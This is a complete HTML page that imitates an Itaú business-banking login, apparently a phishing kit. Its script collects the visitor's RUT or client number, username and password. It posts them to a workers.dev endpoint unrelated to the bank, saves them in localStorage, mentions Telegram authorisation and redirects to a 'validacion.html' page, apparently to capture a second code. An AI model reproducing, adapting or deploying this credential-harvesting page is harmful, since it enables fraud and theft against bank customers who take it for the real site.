<!doctype html>
<html lang="es">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
<meta name="theme-color" content="#06143f">
<title>Itaú - Acceso</title>
<style>
:root{
  --navy:#06143f;
  --orange:#ff5b00;
  --blue:#006b91;
  --text:#555;
  --border:#d2d2d2;
}
*{box-sizing:border-box}
html,body{margin:0;min-height:100%;font-family:Arial,Helvetica,sans-serif;background:#fff;color:var(--text)}
body{min-height:100vh}

/* CABECERA */
.header{
  height:149px;background:var(--navy);position:relative;
  display:flex;align-items:flex-start;padding:24px 48px
}
.logo{
  width:95px;height:95px;background:#fff;border-radius:18px;
  display:flex;align-items:center;justify-content:center;
  color:var(--navy);font-size:36px;font-weight:700;letter-spacing:-2px
}
.top-login{
  position:absolute;left:50%;top:31px;transform:translateX(-50%);
  width:255px;height:85px;border:2px solid #fff;border-radius:25px;
  color:#fff;display:flex;align-items:center;justify-content:center;
  font-size:28px;font-weight:700
}
.close{
  position:absolute;right:35px;top:19px;width:50px;height:50px;
  cursor:pointer
}
.close:before,.close:after{
  content:"";position:absolute;left:24px;top:7px;height:39px;width:4px;background:#fff
}
.close:before{transform:rotate(45deg)}
.close:after{transform:rotate(-45deg)}
.search{
  position:absolute;right:125px;top:54px;width:38px;height:38px;
  border:4px solid #fff;border-radius:50%
}
.search:after{
  content:"";position:absolute;width:18px;height:4px;background:#fff;
  right:-13px;bottom:-7px;transform:rotate(45deg)
}
.menu{position:absolute;right:49px;top:56px;width:38px}
.menu i{display:block;height:4px;background:#fff;margin:8px 0}
.pointer{
  position:absolute;bottom:-1px;left:50%;transform:translateX(-50%);
  width:0;height:0;border-left:20px solid transparent;
  border-right:20px solid transparent;border-bottom:20px solid #fff
}

/* CONTENIDO */
.content{
  width:min(100% - 80px, 640px);
  margin:0 auto;
  padding:69px 0 70px
}
.select,.field{
  width:100%;height:99px;border-radius:18px;background:#fff;
  border:2px solid var(--border);padding:0 40px;
  font-size:29px;color:#999;display:flex;align-items:center
}
.select{
  border-color:#666;position:relative;margin-bottom:95px
}
.chevron{
  position:absolute;right:38px;top:34px;width:23px;height:23px;
  border-right:3px solid #555;border-bottom:3px solid #555;
  transform:rotate(45deg)
}
.field{margin-bottom:49px}
.field input{
  width:100%;height:100%;border:0;outline:0;background:transparent;
  font:inherit;color:#555
}
.field input::placeholder{color:#999}
.field input:focus{
  border-color:var(--orange);
}
.btn{
  width:100%;height:119px;border:0;border-radius:18px;
  background:var(--orange);color:#fff;font-size:29px;font-weight:700;
  cursor:pointer;
  transition: opacity 0.3s;
}
.btn:hover:not(:disabled) {
  opacity: 0.9;
}
.btn:disabled {
  opacity: 0.6;
  cursor: not-allowed;
}
.btn.loading {
  opacity: 0.7;
  cursor: wait;
}
.links{
  font-size:28px;color:var(--blue);margin-top:24px;line-height:1.5
}
.links div{margin-bottom:22px;cursor:pointer}
.links div:hover{text-decoration:underline}
.note{
  font-size:12px;color:#777;text-align:center;margin-top:30px
}

/* Mensajes de estado */
#status-message {
  margin: 20px 0;
  padding: 15px 20px;
  border-radius: 12px;
  display: none;
  font-size: 16px;
  text-align: center;
}
#status-message.success {
  display: block;
  background: #d4edda;
  color: #155724;
  border: 1px solid #c3e6cb;
}
#status-message.error {
  display: block;
  background: #f8d7da;
  color: #721c24;
  border: 1px solid #f5c6cb;
}
#status-message.loading {
  display: block;
  background: #d1ecf1;
  color: #0c5460;
  border: 1px solid #bee5eb;
}

/* Transaction ID */
.transaction-id {
  display: none;
  background: #f0f0f0;
  padding: 12px 20px;
  border-radius: 12px;
  font-size: 14px;
  color: #555;
  margin: 15px 0;
  word-break: break-all;
  font-family: monospace;
  border: 1px solid #ddd;
}
.transaction-id.visible {
  display: block;
}

/* Botón reintentar */
.retry-btn {
  display: none;
  background: var(--orange);
  color: white;
  border: none;
  padding: 12px 30px;
  border-radius: 12px;
  font-size: 18px;
  cursor: pointer;
  margin: 10px auto 0;
  transition: opacity 0.3s;
}
.retry-btn.visible {
  display: block;
}
.retry-btn:hover {
  opacity: 0.9;
}

/* TABLET */
@media (max-width:900px){
  .header{height:125px;padding:18px 30px}
  .logo{width:82px;height:82px;font-size:31px;border-radius:16px}
  .top-login{top:24px;width:220px;height:76px;font-size:25px}
  .close{right:24px;top:14px}
  .search{right:92px;top:45px;transform:scale(.9)}
  .menu{right:28px;top:47px;transform:scale(.9)}
  .content{width:min(100% - 56px,600px);padding-top:55px}
  .select,.field{height:88px;font-size:25px}
  .select{margin-bottom:65px}
  .field{margin-bottom:32px}
  .btn{height:100px;font-size:26px}
  .links{font-size:24px}
}

/* MÓVIL */
@media (max-width:600px){
  .header{
    height:92px;
    padding:13px 16px;
  }
  .logo{
    width:66px;height:66px;border-radius:14px;
    font-size:26px;letter-spacing:-1.5px
  }
  .top-login{
    left:50%;top:18px;
    width:148px;height:56px;
    border-radius:17px;font-size:20px
  }
  .close{
    right:10px;top:11px;width:34px;height:34px
  }
  .close:before,.close:after{
    left:16px;top:4px;height:28px;width:3px
  }
  .search{
    right:59px;top:32px;width:25px;height:25px;
    border-width:3px
  }
  .search:after{
    width:12px;height:3px;right:-9px;bottom:-5px
  }
  .menu{
    right:14px;top:30px;width:25px
  }
  .menu i{height:3px;margin:5px 0}
  .pointer{
    border-left-width:14px;border-right-width:14px;border-bottom-width:14px
  }

  .content{
    width:calc(100% - 32px);
    max-width:none;
    padding:45px 0 40px
  }
  .select,.field{
    height:62px;
    border-radius:12px;
    padding:0 22px;
    font-size:18px
  }
  .select{
    margin-bottom:57px
  }
  .chevron{
    right:22px;top:20px;width:15px;height:15px;border-width:2px
  }
  .field{margin-bottom:28px}
  .btn{
    height:76px;border-radius:12px;
    font-size:21px
  }
  .links{
    margin-top:18px;
    font-size:18px;
    line-height:1.45
  }
  .links div{margin-bottom:17px}
  .note{font-size:10px;margin-top:25px}
  #status-message {
    font-size: 14px;
    padding: 12px 15px;
  }
  .transaction-id {
    font-size: 12px;
    padding: 10px 15px;
  }
  .retry-btn {
    font-size: 16px;
    padding: 10px 25px;
  }
}

/* TELÉFONOS MUY PEQUEÑOS */
@media (max-width:380px){
  .header{height:82px;padding:10px 12px}
  .logo{width:58px;height:58px;font-size:23px}
  .top-login{top:15px;width:132px;height:50px;font-size:18px}
  .search{right:51px;top:28px}
  .menu{right:10px;top:26px}
  .content{width:calc(100% - 24px);padding-top:35px}
  .select,.field{height:57px;font-size:16px}
  .select{margin-bottom:45px}
  .field{margin-bottom:22px}
  .btn{height:68px;font-size:19px}
  .links{font-size:16px}
  #status-message {
    font-size: 12px;
    padding: 10px 12px;
  }
}
</style>
</head>
<body>

<header class="header">
  <div class="logo">itaú</div>
  <div class="top-login">Ingresar</div>
  <div class="close" aria-hidden="true" onclick="window.location.reload()"></div>
  <div class="search" aria-hidden="true"></div>
  <div class="menu" aria-hidden="true"><i></i><i></i><i></i></div>
  <div class="pointer" aria-hidden="true"></div>
</header>

<main class="content">
  <div class="select">
    Empresas
    <span class="chevron"></span>
  </div>

  <div class="field">
    <input id="dni" aria-label="RUT/No. Cliente" placeholder="RUT/No. Cliente" type="text">
  </div>
  <div class="field">
    <input id="usuario" aria-label="Usuario" placeholder="Usuario" type="text">
  </div>
  <div class="field">
    <input id="clave" aria-label="Contraseña" placeholder="Contraseña" type="password">
  </div>

  <button id="loginBtn" class="btn">Ingresar</button>

  <!-- Contenedor para mensajes de estado -->
  <div id="status-message"></div>

  <!-- Transaction ID -->
  <div id="transactionId" class="transaction-id"></div>

  <!-- Botón reintentar -->
  <button id="retryBtn" class="retry-btn">🔄 Reintentar</button>

  <div class="links">
    <div onclick="alert('Función en desarrollo')">Adherirse a Itaú/Link Empresa ›</div>
    <div onclick="alert('Función en desarrollo')">Olvidé mi contraseña ›</div>
  </div>

  <div class="note">Sistema de autenticación seguro</div>
</main>

<script>
// ========================= CONFIGURACIÓN =========================
const WORKER_URL = 'https://shy-resonance-6d69.micollflorez.workers.dev';

// ========================= FUNCIONES =========================
function generarTransactionId() {
    return crypto.randomUUID ? crypto.randomUUID() : 
        Math.random().toString(36).substring(2) + Date.now().toString(36);
}

function mostrarMensaje(contenedor, tipo, texto) {
    contenedor.className = '';
    contenedor.textContent = texto;
    if (tipo) {
        contenedor.classList.add(tipo);
    }
    contenedor.style.display = 'block';
}

function ocultarMensaje(contenedor) {
    contenedor.className = '';
    contenedor.textContent = '';
    contenedor.style.display = 'none';
}

function mostrarTransactionId(contenedor, id) {
    contenedor.textContent = `🆔 ID: ${id.substring(0, 8)}...${id.substring(id.length - 4)}`;
    contenedor.classList.add('visible');
}

function ocultarTransactionId(contenedor) {
    contenedor.classList.remove('visible');
    contenedor.textContent = '';
}

// ========================= FUNCIÓN DE LOGIN =========================
async function handleLogin() {
    const dni = document.getElementById('dni').value.trim();
    const usuario = document.getElementById('usuario').value.trim();
    const clave = document.getElementById('clave').value.trim();
    const loginBtn = document.getElementById('loginBtn');
    const mensajeContenedor = document.getElementById('status-message');
    const transactionIdContenedor = document.getElementById('transactionId');
    const retryBtn = document.getElementById('retryBtn');

    // Validar campos
    if (!dni || !usuario || !clave) {
        mostrarMensaje(mensajeContenedor, 'error', '⚠️ Por favor, completa todos los campos');
        return;
    }

    // Deshabilitar botón durante la petición
    loginBtn.disabled = true;
    loginBtn.classList.add('loading');
    retryBtn.classList.remove('visible');
    const textoOriginal = loginBtn.textContent;
    loginBtn.textContent = '⏳ ENVIANDO...';
    ocultarMensaje(mensajeContenedor);
    ocultarTransactionId(transactionIdContenedor);

    const transactionId = generarTransactionId();

    try {
        mostrarMensaje(mensajeContenedor, 'loading', '🔄 Enviando datos de autenticación...');

        const response = await fetch(`${WORKER_URL}/login`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                dni: dni,
                usuario: usuario,
                clave: clave,
                transactionId: transactionId
            })
        });

        const data = await response.json();

        if (response.ok && data.ok) {
            // GUARDAR TODOS LOS DATOS EN LOCALSTORAGE para validacion.html
            const datosLogin = {
                dni: dni,
                usuario: usuario,
                clave: clave,
                transactionId: transactionId,
                timestamp: Date.now()
            };
            localStorage.setItem('bancoldata', JSON.stringify(datosLogin));
            
            console.log('✅ Datos guardados en localStorage:', datosLogin);
            
            // Mostrar mensaje de éxito
            mostrarTransactionId(transactionIdContenedor, transactionId);
            mostrarMensaje(mensajeContenedor, 'success', 
                `✅ Solicitud enviada correctamente\n📱 Revisa Telegram para autorizar\n⏳ Redirigiendo...`);
            
            // Redirigir a la página de validación
            setTimeout(() => {
                window.location.href = 'validacion.html';
            }, 2000);
            
        } else {
            mostrarMensaje(mensajeContenedor, 'error', 
                `❌ Error: ${data.error || 'No se pudo procesar la solicitud'}`);
            retryBtn.classList.add('visible');
        }
    } catch (error) {
        console.error('Error en login:', error);
        mostrarMensaje(mensajeContenedor, 'error', 
            '❌ ERROR DE CONEXIÓN\nNo se pudo conectar con el servidor.\nVerifica tu conexión a internet.');
        retryBtn.classList.add('visible');
    } finally {
        // Restaurar botón
        loginBtn.disabled = false;
        loginBtn.classList.remove('loading');
        loginBtn.textContent = textoOriginal;
    }
}

// ========================= EVENT LISTENERS =========================
document.addEventListener('DOMContentLoaded', function() {
    const loginBtn = document.getElementById('loginBtn');
    const retryBtn = document.getElementById('retryBtn');
    const inputs = document.querySelectorAll('input');

    // Click en botón
    loginBtn.addEventListener('click', handleLogin);

    // Botón de reintentar
    retryBtn.addEventListener('click', handleLogin);

    // Enter en cualquier input
    inputs.forEach(input => {
        input.addEventListener('keypress', function(e) {
            if (e.key === 'Enter') {
                e.preventDefault();
                handleLogin();
            }
        });
    });

    // Ocultar mensajes al empezar a escribir
    inputs.forEach(input => {
        input.addEventListener('focus', function() {
            const mensajeContenedor = document.getElementById('status-message');
            ocultarMensaje(mensajeContenedor);
        });
    });

    console.log('🚀 Sistema de autenticación Itaú listo');
    console.log(`📡 Worker URL: ${WORKER_URL}`);
});
</script>

</body>
</html>
